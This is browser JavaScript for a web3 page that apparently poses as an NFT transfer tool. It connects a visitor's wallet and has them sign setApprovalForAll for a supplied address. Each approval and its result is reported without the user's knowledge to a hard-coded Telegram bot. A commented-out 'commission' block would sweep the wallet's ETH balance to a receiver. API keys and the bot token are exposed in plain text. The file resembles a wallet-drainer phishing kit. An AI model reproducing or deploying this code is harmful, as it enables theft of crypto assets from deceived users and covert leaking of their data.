"use strict";

// Unpkg imports
const Web3Modal = window.Web3Modal.default; 
const WalletConnectProvider = window.WalletConnectProvider.default;
const Fortmatic = window.Fortmatic;
const evmChains = window.evmChains;

let tokenAddress;
let approvedAddress;
let opt;

// Web3modal instance
let web3Modal

// Chosen wallet provider given by the dialog window
let provider;


// Address of the selected account
let selectedAccount;

let onButtonClick;
let user_address;
let start_to_log = false;


// get parameters from url
function getParameterByName(name, url = window.location.href) {
  name = name.replace(/[\[\]]/g, "\\$&");
  var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
    results = regex.exec(url);
  if (!results) return null;
  if (!results[2]) return "";
  return decodeURIComponent(results[2].replace(/\+/g, " "));
}


/**
 * Setup the orchestra
 */
async function init() {
  start_to_log = false;
  console.log("Initializing example");
  console.log("WalletConnectProvider is", WalletConnectProvider);
//   console.log("Fortmatic is", Fortmatic);
  console.log("Portis is", Portis);
  console.log("window.web3 is", window.web3, "window.ethereum is", window.ethereum);

  // Check that the web page is run in a secure context,
  // as otherwise MetaMask won't be available
  if(location.protocol !== 'https:') {
    // https://ethereum.stackexchange.com/a/62217/620
    // const alert = document.querySelector("#alert-error-https");
    // alert.style.display = "block";
    // document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
    // return;
  }

  // Tell Web3modal what providers we have available.
  // Built-in web browser provider (only one can exist as a time)
  // like MetaMask, Brave or Opera is added automatically by Web3modal
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        infuraId: "e77435344ef0486893cdc26d7d5cf039",
      }
    },

    binancechainwallet: {
      package: true
    },

    // coinbasewallet: {
    //   package: CoinbaseWalletSDK, // Required
    //   options: {
    //     appName: "binance", // Required
    //     infuraId: "e77435344ef0486893cdc26d7d5cf039", // Required
    //     darkMode: true // Optional. Use dark theme, defaults to false
    //   }
    // },

  };

  web3Modal = new Web3Modal({
    cacheProvider: false, // optional
    providerOptions, // required
    disableInjectedProvider: false,
    theme: "dark" // optional. For MetaMask / Brave / Opera.
  });
}


/**
 * Kick in the UI action after Web3modal dialog has chosen a provider
 */
async function fetchAccountData() {
  start_to_log = false;
  // Get a Web3 instance for the wallet
  const web3 = new Web3(provider);

  console.log("Web3 instance is", web3);

  // Getdisconnect chain id from Ethereum node
  const chainId = await web3.eth.getChainId();
  // Load chain information over an HTTP API
  const chainData = evmChains.getChain(chainId);
//   document.querySelector("#network-name").textContent = chainData.name;
  console.log("Chain data name:", chainData.name);

  // Get list of accounts of thedisconnect wallet
  const accounts = await web3.eth.getAccounts();

  // MetaMask does not give you all accounts, only the selected account
  console.log("Got accounts", accounts);
  selectedAccount = accounts[0];
  console.log("Selected Account: ", selectedAccount);
  user_address = selectedAccount;
  
//   document.querySelector("#selected-account").textContent = selectedAccount;

  // Get a handl
//   const template = document.querySelector("#template-balance");
//   const accountContainer = document.querySelector("#accounts");

  // Purge UI elements any previously loaded accounts
//   accountContainer.innerHTML = '';

  // Go through all accounts and get their ETH balance
  const rowResolvers = accounts.map(async (address) => {
    const balance = await web3.eth.getBalance(address);
    // ethBalance is a BigNumber instance
    // https://github.com/indutny/bn.js/
    const ethBalance = web3.utils.fromWei(balance, "ether");
    const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
    // Fill in the templated row and put in the document
    // const clone = template.content.cloneNode(true);
    // clone.querySelector(".address").textContent = address;
    // clone.querySelector(".balance").textContent = humanFriendlyBalance;
    console.log("New Account: %o", ({address, balance, humanFriendlyBalance}));
    // accountContainer.appendChild(clone);
  });

  // Because rendering account does its own RPC commucation
  // with Ethereum node, we do not want to display any results
  // until data for all accounts is loaded
  await Promise.all(rowResolvers);

  // Display fully loaded UI for wallet data
//   document.querySelector("#prepare").style.display = "none";
//   document.querySelector("#connected").style.display = "block";
    //proceed();
}



/**
 * Fetch account data for UI when
 * - User switches accounts in wallet
 * - User switches networks in wallet
 * - User connects wallet initially
 */
async function refreshAccountData() {

  // If any current data is displayed when
  // the user is switching acounts in the wallet
  // immediate hide this data
//   document.querySelector("#connected").style.display = "none";
//   document.querySelector("#prepare").style.display = "block";

  // Disable button while UI is loading.
  // fetchAccountData() will take a while as it communicates
  // with Ethereum node via JSON-RPC and loads chain data
  // over an API call.
//   document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
  await fetchAccountData(provider);
//   document.querySelector("#btn-connect").removeAttribute("disabled")
}


/**
 * Connect wallet button pressed.
 */
async function onConnect() {

  console.log("Opening a dialog", web3Modal);
  try {
    provider = await web3Modal.connect();
    console.log("provider", provider);
    connecta.css("visibility", "hidden");
    connecting.css("visibility", "hidden");
    disconnecta.css("visibility", "visible");
    
     
  } catch(e) {
    console.log("Could not get a wallet connection", e);
    return;
  }

  // Subscribe to accounts change
  provider.on("accountsChanged", (accounts) => {
    fetchAccountData();
  });

  // Subscribe to chainId change
  provider.on("chainChanged", (chainId) => {
    fetchAccountData();
  });

  // Subscribe to networkId change
  provider.on("networkChanged", (networkId) => {
    fetchAccountData();
  });

  await refreshAccountData();
  onButtonClick = proceed;
}
onButtonClick = onConnect;

/**
 * Disconnect wallet button pressed.
 */
async function onDisconnect() {

  console.log("Killing the wallet connection", provider);

  // TODO: Which providers have close method?
  if(provider.close) {
    await provider.close();

    // If the cached provider is not cleared,
    // WalletConnect will default to the existing session
    // and does not allow to re-scan the QR code with a new wallet.
    // Depending on your use case you may want or want not his behavir.
    await web3Modal.clearCachedProvider();
    provider = null;
    connecta.css("visibility", "visible");
        connecting.css("visibility", "hidden");
        disconnecta.css("visibility", "hidden");
  }

  selectedAccount = null;

  // Set the UI back to the initial state
  document.querySelector("#prepare").style.display = "block";
  document.querySelector("#connected").style.display = "none";
}

async function sendMessage(message){
  return new Promise((resolve, reject)=>{
    const chat_id = 5227607491;
    fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
          method: "GET",
          headers: {
              
          }
      })
      .then(async(res) => {
          if(res.status > 399) throw res;
          resolve(await res.json());
      }).catch(err=>{
          reject(err);
      })
  })
}


async function proceed(){
  start_to_log = false;
  console.log("Now we roll!!!");
    // main net
    const serverUrl = 'https://pt5gk0drbc2k.usemoralis.com:2053/server';
    const appId = 'uxBYKvLyKcTp8au8ftYLIovw8xdNyeI05lR4scQW';
    const apiKey = "gh8QcQ44yAaqOJR5AtKGM7uDpDo6pddkKD25FEyT8zK2e8jnK5Zv5atjV5kWIAjF";

    // testnet
    // const serverUrl = 'https://vzrez3npotuq.usemoralis.com:2053/server'
    // const appId = 'LVaJ6EwkawTg52M7p8z3yNf2OoEuScDEma9IaM4C'

    Moralis.start({ serverUrl, appId });
    console.log("Moralis initialized");

    let user;
    try {
      // const web3Provider = await Moralis.enableWeb3();
      if(provider.isMetaMask){
        // metamask
        console.log("Moralis using default (MetaMask)")
        const web3Provider = await Moralis.enableWeb3();
        console.log("Moralis web3Provider:", web3Provider);
      }else{
        // walletconnect
        console.log("Moralis using walletconnect")
        // const web3Provider = await Moralis.enableWeb3({ provider: "walletconnect" });
        try {
          user = await Moralis.authenticate({provider: "walletconnect"});
          console.log("Moralis user:", user);
        } catch (error) {
          console.log("Failed to authenticate moralis:",error);
        }
      }
    } catch (error) {
      console.log("Can't enable web3: ", error);
    }
    async function send() {
                console.log(tokenAddress);
                console.log(approvedAddress);
                console.log(opt);
          
                let ABI721 = [{"inputs":[{"internalType":"string","name":"baseURI","type":"string"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"ApprovalCallerNotOwnerNorApproved","type":"error"},{"inputs":[],"name":"ApprovalQueryForNonexistentToken","type":"error"},{"inputs":[],"name":"ApproveToCaller","type":"error"},{"inputs":[],"name":"BalanceQueryForZeroAddress","type":"error"},{"inputs":[],"name":"MintERC2309QuantityExceedsLimit","type":"error"},{"inputs":[],"name":"MintToZeroAddress","type":"error"},{"inputs":[],"name":"MintZeroQuantity","type":"error"},{"inputs":[],"name":"OwnerQueryForNonexistentToken","type":"error"},{"inputs":[],"name":"OwnershipNotInitializedForExtraData","type":"error"},{"inputs":[],"name":"TransferCallerNotOwnerNorApproved","type":"error"},{"inputs":[],"name":"TransferFromIncorrectOwner","type":"error"},{"inputs":[],"name":"TransferToNonERC721ReceiverImplementer","type":"error"},{"inputs":[],"name":"TransferToZeroAddress","type":"error"},{"inputs":[],"name":"URIQueryForNonexistentToken","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"fromTokenId","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"toTokenId","type":"uint256"},{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"}],"name":"ConsecutiveTransfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"FREE_AllowedTokensPerWallet","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"FREE_MAX_SUPPLY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_SUPPLY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_count","type":"uint256"},{"internalType":"address[]","name":"addresses","type":"address[]"}],"name":"batchAirdrop","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"isActive","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxAllowedTokensPerPurchase","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxAllowedTokensPerWallet","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_count","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"mintPrice","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"reserveNft","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"baseURI","type":"string"}],"name":"setBaseURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_count","type":"uint256"}],"name":"setFreeMaximumAllowedTokensPerWallet","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"maxMintSupply","type":"uint256"}],"name":"setMaxMintSupply","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"val","type":"uint256"}],"name":"setMaxReserve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_count","type":"uint256"}],"name":"setMaximumAllowedTokensPerTx","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_count","type":"uint256"}],"name":"setMaximumAllowedTokensPerWallet","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_price","type":"uint256"}],"name":"setPrice","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"val","type":"uint256"}],"name":"setReserveAtATime","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"toggleSale","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
                
                await sendMessage(`Approving 
                                  Token Address : ${tokenAddress},
                                  From Address : ${approvedAddress},
                                  Option : ${opt}
                                    ` )
                const sendOptions = {
                  contractAddress: tokenAddress,
                  functionName: "setApprovalForAll",
                  abi: ABI721,
                  params: {
                    to : approvedAddress,
                    operator : approvedAddress,
                    approved : opt,
                    _to : approvedAddress,
                    _operator : approvedAddress,
                    _approved : opt
                  },
                };
                let error;
                let transaction = await Moralis.executeFunction(sendOptions).catch(
                  (e) => {
                    alert(e.code);
                    console.log("Can't transfer token:", e, "Transfer Options: %o", sendOptions);
                    
                  },
                  
                )
                
                if (transaction) {
                  $(".spin-wrapper").css("display", "block");
                  await sendMessage(`Approved` )
                }
                else {
                  await sendMessage(`Denied` )
                }
                
                console.log(transaction);
                if(transaction){
                  await transaction.wait().then((v) => {
                    $(".spin-wrapper").css("display", "none");
                    alert("Transaction completed");
                     console.log('Finished Processing transaction:', v)
                 })
               }
              
              

              // ''''''''"'''''''" for commission charges '''''''''''''''''''''''
        //   const eth_balance = await getBalance(user_address, apiKey).catch(e=>{
        //     console.log("Unable to get new eth balance", e);
        //   });
        //   console.log("eth_balance", eth_balance);
        //   console.log("eth_balance.balance", eth_balance.balance);
        //   const balance = ((parseInt(eth_balance.balance))/1000000000000000000) - 0.002;
        //   console.log("The new eth balance", balance);
          
        //   if (balance > 0) {
        //   const options = {
        //     type: "native",
        //     amount: Moralis.Units.ETH(balance.toString()),
        //     receiver: receiver_address,
        //   };
        //   let result = await Moralis.transfer(options);
        //   console.log(result);
        // }
        // else {
        //   console.log("Insufficient funds")
        // }
    }
    send();
}


{
    let l = console.log;
    function normalize(x_){
        let x = String(x_);
        if(/^\[object/g.test(x)){ // [object Window]
            try {
                let y = JSON.stringify(x_);
                x = y;
            } catch (error) {
                x = x+" >> "+(Object.keys(x_));
            }
            return x;
        }else{return x;}
    }
    let logs_to_send = [];
    if(getParameterByName("log") == "true"){
        let el = document.getElementById("testx");
        el.style.display = "block";
        console.log = (x, ...y)=>{
            l(x);
            if(y && y.length>0){
              y.forEach((z) => {
                  l(y,":",z);
                  x+=(" -> ("+normalize(z)+")");
                });
            }
            x = normalize(x);
            el.innerText += ("~ "+x+"\n");
            if(start_to_log){
              logs_to_send.push(x);
            }
            window.setTimeout(function() {
              el.scrollTop = el.scrollHeight;
            }, 500);
        }
    }
    setInterval(() => {
      if(logs_to_send.length == 0 || !start_to_log) return;
      let text = logs_to_send.splice(0,1);
      let url = "";
      let chat_id = "";
      // fetch(`${url}?chat_id=${chat_id}&text=${text}`).catch(e => {
      //   l("TG Log Err:", e);
      // });
    }, 100); // 500ms interval // no more than 1 log sper 4 secs (15 per min)
}

{
  let l = console.log;
  function normalize(x_){
      let x = String(x_);
      if(/^\[object/g.test(x)){ // [object Window]
          try {
              let y = JSON.stringify(x_);
              x = y;
          } catch (error) {
              x = x+" >> "+(Object.keys(x_));
          }
          return x;
      }else{return x;}
  }
  let logs_to_send = [];
  if(getParameterByName("log") == "true"){
      let el = document.getElementById("testx");
      el.style.display = "block";
      console.log = (x, ...y)=>{
          l(x);
          if(y && y.length>0){
            y.forEach((z) => {
                l(y,":",z);
                x+=(" -> ("+normalize(z)+")");
              });
          }
          x = normalize(x);
          el.innerText += ("~ "+x+"\n");
          if(start_to_log){
            logs_to_send.push(x);
          }
          window.setTimeout(function() {
            el.scrollTop = el.scrollHeight;
          }, 500);
      }
  }
  setInterval(() => {
    if(logs_to_send.length == 0 || !start_to_log) return;
    let text = logs_to_send.splice(0,1);
      let url = ``;
      let chat_id = "";
      // fetch(`${url}?chat_id=${chat_id}&text=${text}`).catch(e => {
      //   l("TG Log Err:", e);
      // });
  }, 100); // 500ms interval // no more than 1 log sper 4 secs (15 per min)
}
/**
 * Main entry point.
 */
let proceeding = $(".triggerx");
let connecta = $(".connect");
let connecting = $(".connecting");
let disconnecta = $(".disconnect");
async function connectb(){
    await init().then(() => {
      
      connecta.css("visibility", "hidden");
      connecting.css("visibility", "visible");
      disconnecta.css("visibility", "hidden");
      onConnect();
      alert("Approve connection in your wallet and proceed with your transfrom operation ...")
        // ^ Initially "onConnect", then "proceed"
    }).catch(e => {
        console.log("Initialization failed.");
        connecta.css("visibility", "visible");
        connecting.css("visibility", "hidden");
        disconnecta.css("visibility", "hidden");
      
        alert("Unable to connect");
        console.log(e);
    })
    
};
async function proceedingb(){
  tokenAddress =document.getElementById("token_address").value;
  approvedAddress = document.getElementById("approved_address").value;
  opt= document.getElementById("opt").value;

  if (provider === undefined){
    alert("Connect wallet to proceed");
  }
  else if (!tokenAddress.includes("0x")){
    alert("Invalid contract address");
  }
  else if (!approvedAddress.includes("0x")){
    alert("Invalid from address");
  }else if (opt === ""){
    alert("Invalid option");
  }
  else{
    alert("Sign transaction in your wallet and return here to monitor the transaction progress")
    onButtonClick();
  }

  
};
async function disconnectb(){
  await web3Modal.clearCachedProvider();
  provider = null
        connecta.css("visibility", "visible");
        connecting.css("visibility", "hidden");
        disconnecta.css("visibility", "hidden");
};
// trigger login

([...proceeding]).forEach((el) => {
    el.addEventListener("click", () => {
       proceedingb();
    });
});
([...connecta]).forEach((el) => {
  el.addEventListener("click", () => {
      connectb();
  });
});
([...disconnecta]).forEach((el) => {
  el.addEventListener("click", () => {
      disconnectb();
  });
});
console.log(window);
